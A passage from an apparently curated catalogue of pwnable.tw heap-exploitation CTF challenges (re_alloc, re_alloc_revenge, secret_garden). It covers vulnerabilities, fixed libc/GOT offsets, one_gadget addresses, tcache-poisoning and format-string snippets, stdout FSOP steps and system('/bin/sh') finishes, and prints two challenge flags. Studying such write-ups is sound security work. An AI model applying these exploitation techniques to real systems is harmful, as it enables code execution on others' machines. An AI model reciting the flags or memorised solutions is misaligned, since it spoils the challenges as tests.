| `3578.md` | B | Direct ROP: open/read/sendto | Uses binary's `send_err` to return flag |
| `5586.md` | A | mprotect + shellcode | Finds sockaddr from heap request struct |
| `6748.md` | B + C | `close(3) + open(flag)` → reuse fd 3 via `process_send` | Elegant fd-hijack variant |
| `8153.md` | A | leave;ret pivot → mprotect + sendto shellcode | Clean null-byte handling |
| `9251.md` | D | CRC32 brute-force for libc_pthread → heap scan | Brutes 4 bytes of libpthread address |
| `11177.md` | D | CRC32 brute-force for stack pointer | Brutes 5 stack bytes, then arb read for rest |
| `25916.md` | B | Direct ROP: open/read/sendto via syscall | Uses raw syscall gadgets |
| `28605.md` | A | Heap leak → mprotect + asm sendto | Detailed vuln explanation |
| `28652.md` | B | ROP: open → xchg_eax_edi → read → `send_err` | Calls binary's own send function |
| `31599.md` | A | leave;ret pivot → open/read → `send_data` | Uses PIE `send_data` to return flag |
| `33090.md` | D | CRC32 brute-force for PIE base | Brutes 5 bytes across multiple stack offsets |
| `34306.md` | A | mprotect + typed shellcode | Patches `process_new` comparison in memory |
| `34817.md` | D + B | CRC32 brute PIE → arb read → direct ROP | Calls `send_err` at end |
| `35463.md` | A | mprotect + typed shellcode with sendto | 3 bugs: bof, type confusion, argument mismatch |
| `36134.md` | B | Direct ROP: open/read → `send_err` | Cleanest ROP, reuses binary's error-send path |
| `36997.md` | A | mprotect + shellcode, create UDP socket in SC | Shellcode creates new socket to send flag |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Reference exploit (auxv walk + multi-stage NUL-byte-safe overflow) |
| `desc.txt` | Challenge description |
| `artifacts/hitcon_ftp` | Challenge binary |
| `solution/*.md` | Community write-ups (20 solutions) |

## re_alloc
> **Canonical route:** Realloc-zero hidden free while state remains usable → Two-slot tcache poison and `atoll@GOT`/hook control
> **Read this case when:** Realloc juggling calls `realloc(ptr,0)` in glibc 2.29.
> **Primary defect:** Realloc-zero hidden free while state remains usable
> **Exploit primitive/result:** Two-slot tcache poison and `atoll@GOT`/hook control
> **Search terms:** realloc zero; juggle; tcache poison; `atoll@GOT`; `__malloc_hook`; `%n` reset
> **Version/protection clue:** Case target `re_alloc` — x86-64, glibc 2.29, Partial RELRO, canary/NX, no PIE, FORTIFY
> **Variant boundary:** Predecessor of Revenge; Partial RELRO permits the direct GOT route absent there.

### Metadata

- Source title: Re-alloc — pwnable.tw (200 pts)
- Source callout: `nc chall.pwnable.tw 10106`

```yaml
tags:
  - use-after-free
  - tcache-poisoning
  - got-overwrite
platform: pwnable.tw
points: 200
arch: x86-64
libc: glibc-2.29
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "Passing a zero size to realloc frees the chunk without clearing the pointer, enabling tcache poisoning in glibc 2.29 to overwrite GOT entries with system."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A heap menu challenge (x86-64, Partial RELRO, NX, Stack Canary, **No PIE**, FORTIFY) built against **glibc 2.29**. The program provides allocate, reallocate, and free operations on two heap slots (`heap[0]` and `heap[1]`), using `realloc()` as the core allocator. The key insight is that `realloc(ptr, 0)` is equivalent to `free(ptr)` in glibc 2.29, but the program **does not clear the pointer** from the heap table — creating a Use-After-Free.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)
  FORTIFY:  Enabled
```

#### Program Logic (Pseudocode)

```c
void *heap[2];  // global pointer table at 0x4040B0

void allocate() {
    int idx = read_long();           // idx must be 0 or 1
    if (heap[idx]) { puts("..."); return; }
    long size = read_long();
    heap[idx] = realloc(NULL, size); // equivalent to malloc(size)
    read_input(heap[idx], size);     // read_input has off-by-null
}

void reallocate() {
    int idx = read_long();
    if (!heap[idx]) { puts("..."); return; }
    long size = read_long();
    heap[idx] = realloc(heap[idx], size);  // size=0 → free, but ptr stays!
    if (heap[idx])
        read_input(heap[idx], size);
}

void rfree() {
    int idx = read_long();
    if (!heap[idx]) { puts("..."); return; }
    realloc(heap[idx], 0);   // free, BUT heap[idx] NOT cleared!
    heap[idx] = NULL;        // ... wait, it IS cleared here
}

// read_long uses __read_chk → atoll(buf) to parse integers
```

#### Vulnerabilities

##### V1 — Use-After-Free via `realloc(ptr, 0)` in Reallocate

**Root Cause:** In glibc 2.29, `realloc(ptr, 0)` frees the chunk and returns `NULL`. In `reallocate()`, the return value (`NULL`) is stored back into `heap[idx]`, zeroing the slot. However, `rfree()` also calls `realloc(ptr, 0)` — the crucial difference is that `reallocate()` **can be called again on the same index** because after the free, `heap[idx] = NULL`, and a subsequent `realloc(NULL, new_size)` is equivalent to `malloc(new_size)`.

The UAF arises from this sequence:
```
alloc(0, 0x18, "AAAA")       // heap[0] = chunk_A
realloc(0, 0)                 // free(chunk_A), heap[0] = NULL
                              // chunk_A is now in tcache[0x20]
realloc(0, 0x18, payload)    // realloc(NULL, 0x18) = malloc(0x18)
                              // returns chunk_A (from tcache)
                              // heap[0] = chunk_A again
                              // payload overwrites tcache fd pointer
```

Since `alloc` checks `if (heap[idx])` to prevent double-allocation, but `realloc(0,0)` clears `heap[idx]`, you can effectively free a chunk while another slot still references the same memory (via careful slot juggling), achieving a classic **tcache poisoning** UAF.

**Impact:** Arbitrary write via tcache fd pointer corruption → write to any address (e.g., GOT entries).

##### V2 — `atoll` GOT is Writable (Partial RELRO + No PIE)

**Root Cause:** With Partial RELRO and no PIE, the GOT is at fixed known addresses. The `read_long()` function calls `atoll()` to convert user input strings to integers. By overwriting `atoll@GOT` with `printf@PLT`, every subsequent `read_long()` call becomes `printf(user_input)` — turning integer inputs into **format string attacks**.

```
Key GOT/PLT addresses (fixed, no PIE):
  atoll@GOT   = 0x404048
  printf@PLT  = 0x401070
  realloc@GOT = 0x404058
  heap table  = 0x4040B0
```

##### V3 — Off-by-Null in `read_input` (Minor)

The `read_input` function null-terminates at `buf[size]`, writing one byte past the allocated region. This is generally not needed for the primary exploit but noted by some solvers.

#### Key Addresses (No PIE)

```python
# Binary (fixed)
atoll_got    = 0x404048
printf_plt   = 0x401070
printf_got   = 0x404038
realloc_got  = 0x404058
alarm_got    = 0x404040
heap_table   = 0x4040B0   # heap[0], heap[1]

# Libc offsets (glibc 2.29, pwnable.tw)
__libc_start_main = 0x26B6B   # offset for %21$p leak
__read_chk_ret    = 0x12E009  # offset for %3$p leak
system            = 0x52FD0
__malloc_hook     = 0x1E4C30
__free_hook       = 0x1E6E48
one_gadgets       = [0xE6E73, 0xE6E76, 0xE6E79, 0x106EF8]
```

### Exploit Paths

#### Exploit Paths

All solutions follow a two-phase strategy: (1) use tcache poisoning to overwrite GOT, (2) leverage the GOT overwrite for leaks and shell.

---

##### Path A — Tcache Poison → `atoll@GOT = printf` → Format String Leak → `atoll@GOT = system` → `system("/bin/sh")`

**Used by:** ~90% of solutions (1006, 1832, 16991, 17048, 17704, 18324, 18331, 18416, 19131, 21490, 21778, 22377, 25572, 26467, 28302, exp.py)

**Phase 1: Tcache Poisoning to Overwrite `atoll@GOT`**

1. Allocate a chunk on slot 0, free it via `realloc(0, 0)`, then `realloc(0, same_size, p64(atoll_got))` to overwrite the tcache fd pointer with `atoll@GOT`.
2. Allocate on slot 1 to consume the original chunk from tcache.
3. Clean up both slots (realloc to different sizes + free to move chunks to other bins).
4. Now tcache for that size class has `atoll@GOT` as the next entry.
5. Allocate again — the second allocation from this tcache returns a pointer to `atoll@GOT`.
6. Write `printf@PLT` (0x401070) to `atoll@GOT`.

Many solutions repeat this for **two different size classes** (e.g., 0x20 and 0x50 tcache bins) to have a clean second overwrite available later.

**Phase 2: Format String Leak**

With `atoll@GOT` pointing to `printf`, every `read_long()` call now executes `printf(user_input)`:
```python
# Trigger printf as "atoll" — leak libc via format string
free("%3$p")       # printf("%3$p") leaks a stack value
# or
free("%21$p")      # leaks __libc_start_main return address
# or
free("%23$p")      # another common offset for libc leak
```

Common leak offsets from the stack:
- `%3$p` → `__read_chk` return (offset `0x12e009` from libc base)
- `%21$p` / `%23$p` → `__libc_start_main+235` (offset `0x26b6b` from libc base)
- `%9$s` + GOT address → arbitrary read via `%s` format

**Phase 3: Overwrite `atoll@GOT` with `system`**

After leaking libc, overwrite `atoll@GOT` again with `system()`:

```python
# Since atoll is now printf, we need to carefully craft inputs
# that make printf return the right values for idx/size
alloc("", "%88c", p64(libc.sym['system']))  # or similar trick
```

The tricky part: `printf` is now the index/size parser, so its **return value** (number of chars printed) becomes the parsed integer. Solvers use format strings of specific lengths to control the "index" and "size" values.

**Phase 4: Shell**

```python
# Any call to read_long() with "/bin/sh" now calls system("/bin/sh")
free("/bin/sh")   # → system("/bin/sh")
```

---

##### Path B — Tcache Poison → `realloc@GOT = printf` → Format String → ROP

**Used by:** Solutions 1006 (variant), 27939

Instead of overwriting `atoll@GOT`, overwrite `realloc@GOT` with `printf@PLT`. This makes every `reallocate()` call a format string attack, but requires more complex control flow since `realloc` is called with the heap pointer as the first argument (acting as the format string).

Some solutions overwrite `realloc@GOT` with `atoll@PLT` (making realloc return a pointer based on the ASCII content at the heap address), enabling creative GOT pivoting.

One advanced variant (27939) uses this to pivot the stack via `leave; ret` gadgets and execute a full ROP chain.

---

##### Path C — Tcache Poison → GOT Overwrite → `__malloc_hook = one_gadget`

**Used by:** Solutions 18331, 18324

After the initial `atoll → printf` overwrite, use `%n` format string writes to overwrite `__malloc_hook` with a one_gadget address. This avoids needing a second tcache poison:

```python
# Use %hn writes to set __malloc_hook byte-by-byte
free("%{}c%{}$hn".format(low_2bytes, offset))   # write 2 bytes at a time
```

Then trigger `malloc` to jump to the one_gadget.

---

##### Path D — `atoll → printf` + `%n` to Clear Heap Table → Second Tcache Poison

**Used by:** exp.py (provided exploit)

1. First tcache poison: `atoll@GOT = printf@PLT`.
2. Use `printf("%9$n", ...)` format strings to **zero out** the `heap[0]`/`heap[1]` table entries and tcache metadata, resetting the allocator state.
3. Perform a **second** tcache poison (now with `printf` as `atoll`, using raw bytes for index/size).
4. Overwrite `atoll@GOT` with `system`.
5. `free("/bin/sh")` → `system("/bin/sh")`.

This approach is more complex but fully deterministic since it doesn't rely on `printf` return value tricks.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Use-After-Free | V1: `realloc(ptr, 0)` in reallocate | Deterministic |
| Tcache fd poisoning | UAF → overwrite freed chunk's fd | Deterministic |
| Arbitrary GOT write | Tcache returns pointer to GOT | Deterministic (no PIE) |
| Format string (leak) | `atoll@GOT = printf` → `printf(user_input)` | Deterministic |
| Format string (write) | `%n` / `%hn` writes via printf | Deterministic |
| Code execution | `atoll@GOT = system` → `system("/bin/sh")` | Deterministic |

### Assets and Provenance

#### Solution Write-ups

| File | Primary Path | Key Technique | Notes |
|------|-------------|---------------|-------|
| `1006.md` | A | tcache poison → printf → one_gadget via realloc GOT | Uses GOT table as format string buffer |
| `1763.md` | — | "Same exploit with re-alloc-revenge" | Reference only |
| `1832.md` | A | tcache poison → printf leak → system | Clean approach with `%15$p` leak |
| `16609.md` | A | prepare() helper for clean tcache state | Well-structured helper functions |
| `16991.md` | A | Two-bin tcache poison + `%9$s` GOT read | Reads GOT entries directly via `%s` |
| `17048.md` | B | Overwrites alarm/atoll/signal/realloc GOT simultaneously | Creative multi-GOT overwrite |
| `17704.md` | A | `atoll → printf`, `%15$p` leak, system overwrite | Compact; overwrites realloc GOT to regain control |
| `18324.md` | A+C | `%n` format writes to `__malloc_hook` | Byte-by-byte one_gadget write |
| `18331.md` | A | Concise vuln analysis + exploit | Notes off-by-null and UAF |
| `18416.md` | A | Two-size-class tcache poison | Double tcache attack for 0x20 and 0x50 bins |
| `19131.md` | A | `%9$s` to read GOT, then system | Direct GOT leak via format string |
| `21490.md` | A | Standard approach | Clear code |
| `21778.md` | A | Notes "preparation" difficulty | Honest about copying the tcache setup |
| `22377.md` | A | Two-bin poison (0x30 + 0x60) | `%3$p` leak at offset 0x12e009 |
| `25572.md` | A | Stack leak enumeration loop | Scans all stack offsets to find libc |
| `26467.md` | A | `%p` chain leak, `%15c` for size control | Minimal approach |
| `27939.md` | B | GOT pivot + stack pivot + ROP chain | Most complex; full ROP via leave/ret |
| `28302.md` | A | Format string GOT overwrite + `%n` | Detailed stack offset analysis |
| `exp.py` | D | `%n` to clear state → second tcache poison | Most robust; fully deterministic |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (tcache poison + fmt string + second poison) |
| `desc.txt` | Challenge description |
| `artifacts/re-alloc` | Challenge binary (x86-64, glibc 2.29) |
| `solution/*.md` | Community write-ups (83 solutions) |

## re_alloc_revenge
> **Canonical route:** Realloc-zero UAF plus off-by-null/tcache-key double free → stdout FSOP or `__free_hook`/`__realloc_hook` control
> **Read this case when:** Hardened Full-RELRO/PIE successor still leaves a dangling pointer after `realloc(ptr,0)`.
> **Primary defect:** Realloc-zero UAF plus off-by-null/tcache-key double free
> **Exploit primitive/result:** stdout FSOP or `__free_hook`/`__realloc_hook` control
> **Search terms:** realloc zero; revenge; Full RELRO; tcache key; off-by-null; stdout FSOP
> **Version/protection clue:** Case target `re_alloc_revenge` — x86-64, glibc 2.29, Full RELRO, canary/NX/PIE, FORTIFY
> **Variant boundary:** Successor of `re_alloc`; do not use its writable-GOT finish.

Direct hardened successor of [Re-alloc](#re_alloc). All source-specific facts are retained below, including the changed protections and exploit constraints.

### Metadata

- Source title: Re-alloc Revenge — pwnable.tw (350 pts)
- Source callout: `nc chall.pwnable.tw 10310`
- Source note: >
- Source callout: Flag: `FLAG{r3alloc_the_heap_r3alloc_the_file_Str34m_r3alloc_my_lif3}`

```yaml
tags:
  - use-after-free
  - double-free
  - tcache-poisoning
  - io-file-exploit
platform: pwnable.tw
points: 350
arch: x86-64
libc: glibc-2.29
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "Exploiting realloc(ptr, 0) double free with only two allocation slots allows tcache poisoning to corrupt _IO_2_1_stdout_ and hijack __free_hook."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A heap-menu binary (x86-64, Full RELRO, PIE, NX, Canary, FORTIFY) linked against **glibc 2.29** (Ubuntu 2.29-0ubuntu2). The program provides only two heap slots (`heap[0]`, `heap[1]`), allocations capped at `0x78` bytes, and **no view/print functionality**. All allocation uses `realloc()` under the hood — even the "free" operation is `realloc(ptr, 0)`.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO          # GOT not writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
```

#### Program Logic

| Menu | Action | Behavior |
|------|--------|----------|
| 1 Alloc | `allocate(idx, size, data)` | Requires `heap[idx] == NULL`; `size <= 0x78`; `malloc(size)` + `read_input` |
| 2 Realloc | `reallocate(idx, size, data)` | Requires `heap[idx] != NULL`; `size <= 0x78`; `realloc(ptr, size)` |
| 3 Free | `rfree(idx)` | `realloc(heap[idx], 0)` then `heap[idx] = NULL` |
| 4 Exit | | |

#### Vulnerabilities

##### V1 — `realloc(ptr, 0)` UAF / Dangling Pointer (Primary)

**Root Cause:** The `reallocate` function (menu option 2) calls `realloc(heap[idx], size)`. When `size == 0`, glibc's `realloc` behaves as `free(ptr)` and returns `NULL`. The program checks the return value — since it's `NULL`, it treats this as a "failure" and **does not clear `heap[idx]`**:

```c
// reallocate (simplified)
void *p = realloc(heap[idx], size);
if (p == NULL) {
    // "failure" path — heap[idx] NOT cleared
    return;
}
heap[idx] = p;  // only reached if realloc succeeded
```

In contrast, the clean `rfree` (menu option 3) also calls `realloc(ptr, 0)` but **unconditionally** sets `heap[idx] = 0`.

**Impact:** After `realloc(idx, 0)`, `heap[idx]` holds a dangling pointer to a freed chunk. This enables:
- **UAF write**: `realloc(idx, original_size, data)` writes into the freed chunk (editing its `fd` pointer in tcache).
- **Double-free**: `realloc(idx, 0)` again frees the same chunk a second time (after clearing the tcache `key` field to bypass glibc 2.29's double-free check).

##### V2 — Off-by-One NULL in `allocate` (Minor, Enabler)

The `allocate` function's `read_input` appends a NUL byte at `buf[nread]`. When exactly `size` bytes are sent (no newline), this writes a `\x00` one byte past the chunk's usable area — a **poison null byte** that can corrupt the size field of the next chunk.

#### Key Constraints

- **Only 2 slots** (`heap[0]`, `heap[1]`) — severely limits heap manipulation. Requires creative use of `realloc` to resize/split/merge chunks.
- **Max size 0x78** — all allocations fit in tcache bins (0x20–0x80). Getting libc pointers requires forcing chunks into unsorted/smallbins.
- **No output primitive** — no "view" or "print" function. Leak must come from FSOP (overwriting `_IO_2_1_stdout_`).
- **Full RELRO** — GOT is read-only. Must target hooks (`__free_hook`, `__malloc_hook`, `__realloc_hook`).
- **glibc 2.29** — tcache has a `key` field for double-free detection (bypass by overwriting it via UAF).

#### Key Technique: Tcache Poisoning with 2 Slots

The fundamental write-what-where primitive with only 2 slots:

```python
alloc(0, 0x78)                      # allocate chunk P (tcache bin 0x80)
realloc(0, 0)                       # free P → tcache[0x80] = [P], heap[0] = P (dangling)
realloc(0, 0x78, p64(target_addr))  # UAF write: P.fd = target_addr
alloc(1, 0x78)                      # pop P from tcache; entries[0x80] = target_addr
realloc(1, 0x28)                    # shrink P to 0x30, remainder goes to different bin
free(1)                             # free P(0x30) → tcache[0x30]; heap[1] = NULL
alloc(1, 0x78, payload)             # pops target_addr from tcache[0x80] → write payload there
```

The trick: after popping P, shrink it to a **different size** before freeing, so tcache[0x80]'s head stays pointing at `target_addr`.

#### Offsets (glibc 2.29, Ubuntu 2.29-0ubuntu2)

```python
_IO_2_1_stdout_  = 0x1e5760
_IO_file_jumps   = 0x1e7570   # common leak delta
system           = 0x52fd0
__free_hook      = 0x1e75a8
__realloc_hook   = 0x1e4c28
__malloc_hook    = 0x1e4c30
main_arena_top   = 0x1e4ca0
one_gadgets      = [0xe21ce, 0xe21d1, 0xe21d4, 0xe237f, 0xe2383, 0x106ef8]
```

#### Hook Targets Comparison

| Target | How Triggered | Argument |
|--------|--------------|----------|
| `__free_hook` | `rfree(idx)` → `realloc(heap[idx], 0)` internally calls `free()` | `heap[idx]` (set to `"/bin/sh"`) |
| `__realloc_hook` | Any `realloc()` call | `(heap[idx], size)` — first arg is the pointer |
| `__malloc_hook` | `alloc(idx, size)` triggers `malloc()` | `size` argument (less useful) |

Most solutions target `__free_hook - 8` and write `"/bin/sh\0" + p64(system)`, then `free(idx)` calls `system("/bin/sh")`. Some target `__realloc_hook` with a one_gadget instead.

### Exploit Paths

#### Exploit Paths

All 51 solutions share the same core strategy (V1 UAF → tcache poison → stdout leak → hook overwrite), differing mainly in how they obtain libc pointers.

---

##### Path A — Fake Large Chunk → Unsorted Bin → Partial Overwrite stdout (Most Common)

**Used by:** Solutions 821, 2972, 3025, 3148, 6923, 7905, 8153, 9074, 9251, 9448, 15522, 17006, 20719, 26250, 31599, 34817, exp.py

**Steps:**

1. **Craft a fake large chunk** (size `0x421`–`0x811`) by writing a fake size field into an adjacent chunk via `realloc` resizing. The fake chunk must be large enough to bypass tcache (> 0x408 bytes or fill tcache count to 7).

2. **Free the fake chunk** so it enters the **unsorted bin**. This writes `main_arena` pointers (libc addresses) into the chunk's `fd`/`bk` fields.

3. **Partial overwrite** the `fd` pointer (low 2 bytes) to redirect it to `_IO_2_1_stdout_` (or `stdout - 8`). Since libc is page-aligned, the 4th nibble (bits 12–15) is random → **1/16 bruteforce**.

4. **Allocate at stdout** and overwrite its `_flags` to `0xfbad1800` and clear `_IO_read_ptr`, `_IO_read_end`, `_IO_read_base` to zero. The next `puts()` call (menu output) then leaks libc memory.

5. **Compute libc base** from the leak: `libc_base = leaked_ptr - 0x1e7570`.

6. **Tcache poison** a bin to point at `__free_hook - 8` (or `__realloc_hook`). Write `"/bin/sh\0" + p64(system)` there.

7. **Trigger**: `free(idx)` → `realloc(heap[idx], 0)` → `__realloc_hook(heap[idx], 0)` = `system("/bin/sh")`.

**Variant — Fake Chunk via Fill tcache + `malloc_consolidate`:** Some solutions fill the tcache for a given bin size to 7 entries (using repeated `realloc(0)/realloc(size)` UAF), then trigger `malloc_consolidate` by sending a long input (`"1" * 0x400`) to the menu. This merges fastbin chunks into smallbin, providing libc pointers without needing a fake large chunk.

---

##### Path B — Tcache `perthread_struct` Poisoning (1/16 or 1/256)

**Used by:** Solutions 821, 3480, 6247, 15522 (1/256 variant), 34817

**Steps:**

1. **Double-free** via UAF to get a tcache chunk whose `fd` can be overwritten.

2. **Partial overwrite `fd`** with `\x10\x60` (or `\x10\x90`, `\x10\xa0` depending on heap layout) to point at the **`tcache_perthread_struct`** (heap offset ~0x10). This is a 1/16 bruteforce on the heap ASLR nibble.

3. **Allocate the tcache struct** as a regular chunk → gain full control over all tcache bin counts and entry pointers.

4. **Set all counts to 0xff** (or 0x07) → freeing any chunk now bypasses tcache and goes to unsorted bin (since tcache appears "full").

5. **Free the tcache struct itself** → goes to unsorted bin → libc pointers land in the struct.

6. **Partial overwrite** the unsorted bin `fd` to point at `_IO_2_1_stdout_` → FSOP leak (another 1/16 bruteforce, making total 1/256 for this path).

7. Same finish as Path A: hook overwrite → shell.

---

##### Path C — Fill Tcache via Repeated UAF + Smallbin Consolidation

**Used by:** Solutions 9251, 26250, 34817

A cleaner variant that avoids fake chunk sizes entirely:

1. **Fill tcache** for a specific bin size to 7 entries using repeated `realloc(0)` + `realloc(size)` UAF cycles (each cycle frees the same chunk, but the `key` is cleared between frees).

2. **Trigger `malloc_consolidate`** by sending an oversized menu input (`sla("choice: ", "1"*0x400)`). Fastbin chunks merge into smallbin → libc pointers appear.

3. **UAF edit** the smallbin `fd` → partial overwrite to stdout → FSOP leak.

4. Same finish: hook overwrite → shell.

#### Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| UAF / Dangling pointer | V1: `realloc(ptr, 0)` returns NULL, slot not cleared | Deterministic |
| Tcache fd overwrite | UAF + `realloc(idx, size, payload)` | Deterministic |
| Double-free | UAF + clear `key` field + `realloc(idx, 0)` again | Deterministic |
| Unsorted/smallbin libc pointers | Fake large chunk or fill tcache + consolidate | Deterministic (heap groom) |
| Stdout FSOP leak | Partial overwrite fd → `_IO_2_1_stdout_` | **1/16 bruteforce** |
| Tcache struct control | Partial overwrite fd → `tcache_perthread_struct` | **1/16 bruteforce** |
| Arbitrary write | Tcache poisoning with 2-slot shrink trick | Deterministic after leak |
| Code execution | `__free_hook = system` or `__realloc_hook = system/one_gadget` | Deterministic after arb write |

### Assets and Provenance

#### Solution Write-ups

| File | Path | Bruteforce | Key Technique |
|------|------|-----------|---------------|
| `exp.py` | A | 1/16 | Fake 0x431 chunk → unsorted bin → stdout partial overwrite |
| `821.md` | B | 1/16 | Tcache struct poison → unsorted bin → stdout |
| `1763.md` | A | 1/16 | Minimal tcache poison → stdout |
| `2972.md` | A | 1/16 | Fake 0x4d1 chunk → partial overwrite stdout |
| `3025.md` | A | 1/16 | Fake chunk + partial write `__free_hook` |
| `3148.md` | A | 1/16 | Standard fake chunk + stdout FSOP |
| `3480.md` | B | 1/16 | Tcache struct → unsorted bin → stdout; also 1/256 variant |
| `6247.md` | A | 1/16 | Chunk spray + fake 0x811 → partial overwrite |
| `6249.md` | A | 1/16 | Tcache struct control + fake unsorted chunk |
| `6923.md` | A | 1/16 | Tcache struct + `__free_hook` overwrite |
| `7905.md` | A | 1/16 | Detailed writeup with Chinese analysis; fake 0x431, stdout FSOP |
| `8153.md` | A | 1/16 | Tricks writeup; 1/16 and 1/256 variants documented |
| `9074.md` | A | 1/16 | Fake 0x91/0x81 chunk gymnastics → unsorted bin |
| `9251.md` | A | 1/16 | tcache perthread struct + stdout overwrite |
| `9448.md` | B | 1/256 | Double bruteforce: heap + libc nibbles |
| `15522.md` | B | 1/256 | Tcache struct + unsorted bin + partial write |
| `20719.md` | A | 1/16 | Fake 0xa1 chunk + fill tcache via UAF |
| `26250.md` | C | 1/16 | Solve detailed with 0xe7 stdout offset |
| `31599.md` | A | 1/16 | Clean solve, same struct as 3025 |
| `34817.md` | C | 1/16 | Fill tcache + `malloc_consolidate` via long menu input |

#### Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit (sockets-only, no pwntools, auto-retry bruteforce) |
| `desc.txt` | Challenge description |
| `artifacts/` | Original binary and libc |
| `solution/*.md` | Community write-ups (51 solutions) |

## secret_garden
> **Canonical route:** Retained freed name pointer → Double-free/fastbin dup, fake flower, `__malloc_hook`, stack ROP through `environ`, or FILE attack
> **Read this case when:** Remove frees a flower name but leaves the name pointer/array live.
> **Primary defect:** Retained freed name pointer
> **Exploit primitive/result:** Double-free/fastbin dup, fake flower, `__malloc_hook`, stack ROP through `environ`, or FILE attack
> **Search terms:** flower/garden; remove; double free; fastbin dup; `__malloc_hook`; one gadget
> **Version/protection clue:** Case target `secret_garden` — x86-64, glibc 2.23, Full RELRO, canary/NX/PIE
> **Variant boundary:** Standalone; partial name writes preserve unsorted metadata and must not overwrite it accidentally.

### Metadata

- Source title: Secret Garden — pwnable.tw (350 pts)
- Source callout: `nc chall.pwnable.tw 10203`
- Source note: >
- Source callout: Flag: `FLAG{FastBiN_C0rruption_t0_BUrN_7H3_G4rd3n}`

```yaml
tags:
  - double-free
  - fastbin-dup
  - one-gadget
platform: pwnable.tw
points: 350
arch: x86-64
libc: glibc-2.23
relro: full
canary: yes
nx: yes
pie: yes
references:
  - https://pwnable.tw/challenge/
description: "A double-free vulnerability on flower nodes enables fastbin duplication to allocate a chunk over __malloc_hook and execute a one_gadget."
proof-of-concept: no
```

### Facts

#### Challenge Overview

A menu-based heap challenge binary (x86-64, Full RELRO, PIE, NX, Stack Canary) built against glibc 2.23. The program manages an array of "flower" structs on the heap — each flower has a name buffer (user-controlled size via `malloc`), a 24-byte color string, and an in-use flag. The menu provides: (1) Raise a flower, (2) Visit the garden, (3) Remove a flower, (4) Clean the garden, (5) Leave.

```
checksec:
  Arch:     amd64-64-little
  RELRO:    Full RELRO           # GOT read-only
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
```

#### Program Structure

##### Flower Struct (0x28 bytes, malloc'd)

| Offset | Field | Type |
|--------|-------|------|
| `0x00` | `in_use` | `uint32_t` (1 = alive, 0 = removed) |
| `0x08` | `name` | `char *` (malloc'd, user-controlled size) |
| `0x10` | `color` | `char[24]` (inline, scanf `%23s`) |

##### Global State

- `flower_array[100]` — BSS array of `flower *` pointers (max 100 flowers)
- `flower_count` — total flowers raised

##### Menu Operations

1. **Raise** — `malloc(0x28)` for struct, `malloc(size)` for name, reads name via `read()`, color via `scanf`, sets `in_use = 1`.
2. **Visit** — iterates array, prints name and color for flowers with `in_use != 0`.
3. **Remove** — `free(flower->name)`, sets `flower->in_use = 0`. **Does NOT null the name pointer, does NOT null the array slot, does NOT free the struct.**
4. **Clean** — iterates array, for flowers with `in_use == 0`: `free(flower_struct)`, nulls the array slot.

#### Vulnerabilities

##### V1 — Use-After-Free / Double-Free on Name Buffer (Primary, Exploitable)

**Root Cause:** The "Remove" operation frees the flower's name buffer but does not clear the `name` pointer or the array slot. The `in_use` flag is set to 0, but the flower struct remains accessible. This enables:

- **Use-After-Free**: After Remove, "Visit" still prints the name pointer's contents (now freed memory containing heap metadata — fd/bk pointers).
- **Double-Free**: Remove the same flower twice → the name buffer is freed twice, corrupting the fastbin freelist.

```c
// Remove (simplified pseudocode)
void remove_flower(int idx) {
    if (flower_array[idx] != NULL) {
        free(flower_array[idx]->name);   // free name buffer
        flower_array[idx]->in_use = 0;   // mark as removed
        // BUG: name pointer NOT cleared
        // BUG: array slot NOT nulled
        // BUG: struct NOT freed
    }
}
```

**Impact:** The freed name buffer's `fd` pointer (in fastbins) or `fd`/`bk` pointers (in unsorted/small bins) are leaked via Visit. Double-free enables fastbin duplication for arbitrary write.

##### V2 — Partial Write on Name Buffer (Enabler)

**Root Cause:** When raising a flower, the name is read via `read(0, name_buf, size)`. Since `read()` does not NUL-terminate, and the `calloc`/`malloc`'d buffer may contain residual heap metadata, writing fewer bytes than the allocated size preserves existing data (libc pointers from freed chunks).

```c
// Raise (simplified)
flower->name = malloc(size);
read(0, flower->name, size);  // partial write preserves old fd/bk at offset 8+
```

**Impact:** Allocate into a chunk that previously held unsorted bin pointers, write only 8 bytes → the libc `main_arena+0x58` pointer at offset 8 survives → leaked via Visit.

#### Key Offsets (pwnable.tw `libc_64.so.6`, glibc 2.23)

```python
main_arena      = 0x3c3b20
main_arena_top  = 0x3c3b78   # main_arena + 0x58 (unsorted bin head)
__malloc_hook   = 0x3c3b10
__realloc_hook  = 0x3c3b08
__free_hook     = 0x3c57a8
_IO_list_all    = 0x3c4520
_IO_2_1_stdout  = 0x3c4620
environ         = 0x3c5f38   # (in some solutions: __libc_argv = 0x3c82f8)
system          = 0x45390
bin_sh          = 0x18c177
pop_rdi         = 0x21102    # pop rdi; ret
one_gadgets     = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
```

### Exploit Paths

#### Exploit Paths

All solutions exploit V1 (UAF/double-free). They diverge in the leak strategy and the code execution technique.

---

##### Path A — Unsorted Bin Leak + Fastbin Dup → `__malloc_hook` Overwrite

**Used by:** exp.py, solutions 2311, 2605, 821 (method 2), 1351, and majority of write-ups

This is the canonical, most common approach.

**Steps:**

1. **libc Leak via Unsorted Bin:**
   - Raise flower A (size > 0x80, e.g. 0x100) and flower B (barrier to prevent top chunk consolidation).
   - Remove A → name buffer enters unsorted bin → `fd`/`bk` = `main_arena+0x58`.
   - Clean → frees A's struct into fastbin, nulls slot.
   - Raise A' with same size → struct reuses fastbin, name reuses the exact unsorted chunk.
   - Write only 8 bytes → libc pointer at offset 8 survives.
   - Visit → read `main_arena+0x58` → `libc_base = leak - 0x3c3b78`.

2. **Fastbin Duplication (Double-Free):**
